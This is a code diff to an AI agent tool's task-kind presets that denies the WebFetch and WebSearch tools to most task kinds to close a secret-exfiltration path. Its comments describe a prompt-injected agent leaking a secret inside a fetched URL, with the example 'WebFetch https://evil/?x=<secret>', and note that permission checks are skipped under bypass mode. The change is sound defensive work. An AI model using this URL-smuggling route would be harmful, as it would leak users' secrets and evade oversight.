@@ -23,6 +23,32 @@ export const WRITE_TOOLS: readonly string[] = [
 ] as const;
 
 /**
+ * The native web tools that reach the network — an EGRESS channel. `WebFetch`
+ * issues a GET whose URL/query string the model controls, so a prompt-injected
+ * task can smuggle a just-read secret out inside the URL
+ * (`WebFetch https://evil/?x=<secret>`); `WebSearch` sends an attacker-chosen
+ * query string outbound. Under the studio's default `bypassPermissions`,
+ * `canUseTool` is never consulted, so the ONLY thing that stops these is the SDK
+ * `disallowedTools` (which the SDK enforces regardless of permission mode). We
+ * therefore deny them by default for every kind that has no legitimate need to
+ * reach the live web — `build`/`tdd` (write code), `review`/`decompose` (read-only
+ * analysis) — closing the automated GET-exfil path the Bash `network-exfiltration`
+ * rule cannot see. The ONE deliberate exception is `research`: selecting it in the
+ * task-kind picker IS the explicit, per-task opt-in to web egress (the finding's
+ * "gate research web access behind explicit config"). The Insight/Harness scans
+ * deny these separately via `ANALYSIS_DISALLOWED_TOOLS`.
+ *
+ * NOTE: this is a whole-tool block, not a domain allowlist. A per-URL WebFetch
+ * allowlist (which needs URL inspection, so it must ride the PreToolUse hook, not
+ * `disallowedTools`) would let `research` reach a curated set of hosts instead of
+ * the open web — a follow-up once a config surface exists to hold the allowlist.
+ */
+export const NETWORK_EGRESS_TOOLS: readonly string[] = [
+  'WebFetch',
+  'WebSearch',
+] as const;
+
+/**
  * The agent-definition half of a task kind. Every field is optional: an absent
  * field means "inherit the session default", so the `build` preset (all absent)
  * leaves a session at its default behavior.
@@ -90,34 +116,51 @@ const DECOMPOSE_SYSTEM_PROMPT = [
 ].join(' ');
 
 /**
- * Resolve a task kind to its agent preset. `build`/`research` carry no overrides —
- * they inherit every session default, so their runs are unchanged. `review` is the
- * internal verification reviewer; `tdd` adds a test-first persona; `decompose`
- * adds a read-only planning persona that ends with a JSON sub-task array (parsed
- * by the engine into `proposedSubtasks`).
+ * Resolve a task kind to its agent preset. Every kind EXCEPT `research` denies the
+ * network-egress tools ({@link NETWORK_EGRESS_TOOLS}) so that under the default
+ * `bypassPermissions` a prompt-injected task cannot exfiltrate a secret via
+ * `WebFetch`/`WebSearch`; `research` is the deliberate web-enabled opt-in and is
+ * the only kind that inherits an unrestricted toolset. `review` is the internal
+ * verification reviewer; `tdd` adds a test-first persona; `decompose` adds a
+ * read-only planning persona that ends with a JSON sub-task array (parsed by the
+ * engine into `proposedSubtasks`).
  */
 export function resolveKindPreset(kind: TaskKind | undefined): KindPreset {
   switch (kind) {
     case 'review':
       return {
         appendSystemPrompt: REVIEWER_SYSTEM_PROMPT,
-        disallowedTools: [...WRITE_TOOLS],
+        // Read-only reviewer: deny writes AND web egress (it inspects a diff, it
+        // never needs the network).
+        disallowedTools: [...WRITE_TOOLS, ...NETWORK_EGRESS_TOOLS],
         // Verification is unattended; `dontAsk` never prompts. A tool that would
         // need a prompt is refused, so the reviewer can't hang the gate.
         permissionMode: 'dontAsk',
       };
     case 'tdd':
-      // Build-like: writes code, so no tool restriction; only the persona differs.
-      return { appendSystemPrompt: TDD_SYSTEM_PROMPT };
+      // Build-like: writes code, so no WRITE restriction; only the persona differs.
+      // Web egress is denied (like the default `build` kind) — a code-writing run
+      // has no need to reach the live web and it is an exfil channel under bypass.
+      return {
+        appendSystemPrompt: TDD_SYSTEM_PROMPT,
+        disallowedTools: [...NETWORK_EGRESS_TOOLS],
+      };
     case 'decompose':
-      // Read-only analysis: deny writes so it can only propose, never mutate.
+      // Read-only analysis: deny writes so it can only propose, never mutate — and
+      // deny web egress (it investigates the local codebase, not the network).
       return {
         appendSystemPrompt: DECOMPOSE_SYSTEM_PROMPT,
-        disallowedTools: [...WRITE_TOOLS],
+        disallowedTools: [...WRITE_TOOLS, ...NETWORK_EGRESS_TOOLS],
       };
     case 'build':
-    case 'research':
     case undefined:
+      // The default kind. It writes code but has no inherent need to reach the live
+      // web, so web egress is denied by default (closing the automated exfil path
+      // under bypass). Everything else inherits the session default.
+      return { disallowedTools: [...NETWORK_EGRESS_TOOLS] };
+    case 'research':
+      // The ONE web-enabled kind: selecting `research` is the explicit, per-task
+      // opt-in to network egress, so it inherits an unrestricted toolset.
       return {};
   }
 }
